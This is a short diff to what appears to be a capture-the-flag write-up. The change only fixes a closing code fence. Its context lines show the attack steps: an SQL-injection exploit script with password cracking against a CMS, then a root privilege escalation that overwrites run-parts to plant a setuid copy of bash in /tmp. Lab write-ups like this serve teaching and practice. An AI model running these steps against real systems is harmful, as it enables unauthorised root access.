@@ -42,7 +42,8 @@ python cmsms_sqli.py -u http://<IP>/writeup --crack --wordlist rockyou.txt
 printf '#!/bin/bash\ncp /bin/bash /tmp/root; chmod 6777 /tmp/root\n' > /usr/local/bin/run-parts
 chmod +x /usr/local/bin/run-parts
 ssh jkr@<IP>  # triggers run-parts as root
-/tmp/root -p```
+/tmp/root -p
+```
 
 ## Lateral movement
 
